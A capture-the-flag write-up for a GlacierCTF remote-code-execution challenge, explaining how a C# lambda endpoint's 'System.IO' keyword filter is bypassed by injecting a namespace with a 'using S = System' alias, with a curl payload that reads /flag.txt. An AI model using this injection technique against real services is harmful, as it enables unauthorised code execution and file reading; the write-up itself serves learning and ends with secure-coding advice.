# Challenge

It came to our attention that a highly advanced APT targeted our edge computing system. In order to stop the attacks, we implemented even more advanced mitigations.

Think seccomp, but for the web!

Now there's no way an attacker could run malicious code, right?

(Goal: Read flag.txt at the filesystem's root.)

https://rce-as-a-service-2.ctf.glacierctf.com

# Writeup

We can execute a lambda on the server. To read the flag, we can use `System.IO.File.ReadAllText`, but the server does not allow occurrence of `System.IO`:

```csharp
// Here we can adjust the difficulty of the challenge by banning certain functions.
var fileSystemUsage = Regex.IsMatch(query, "System.IO");

if (fileSystemUsage) {
    throw new Exception("'System.IO is not in the edge-computing file. This incident will be reported.'");
}
```

Code template execute remotely:

{% raw %}
```csharp
    var src = $@"
        using System;
        using System.Linq;
        using System.Collections.Generic;
        
        namespace RCE
        {{
            public static class Factory
            {{
                public static Func<IEnumerable<string>, IEnumerable<object>> CreateQuery = {query};
            }}
        }}";
```
{% endraw %}

We can write `using S = System;` and `S.IO.File.ReadAllText` to circumvent the match, but `using S = System` can only be used in namespace.

Therefore, we can create a namespace for it and define a new function:

```csharp
using System;
using System.Linq;
using System.Collections.Generic;
        
namespace RCE
{
    public static class Factory
    {
        public static Func<IEnumerable<string>, IEnumerable<object>> CreateQuery = (data) => data.Select(d => RCE.T.C.Read(@"/flag.txt"));
    }
    namespace T {
        using S = System;
        public class C {
            public static string Read(string path) {
                return S.IO.File.ReadAllText(path);
            }
        };
    }
}
```

This is similar to SQL injection: we inject additional namespaces and classes into the code, and maintain the brackets. Capture the flag:

```shell
curl -vvv \
--request POST \
--url https://rce-as-a-service-2.ctf.glacierctf.com/rce \
--header 'Content-Type: application/json' \
--data '{
"Data": ["hello", "crypto", "lena"],
"Query": "(data) => data.Select(d => RCE.T.C.Read(@\"/flag.txt\")); } namespace T { using S = System; public class C { public static string Read(string path) { return S.IO.File.ReadAllText(path); } }"
}'
# => glacierctf{L1V1N_ON_TH3_3DG3}
```

# Conclusion

Do not allow RCE. Do not use strings from user input to concat.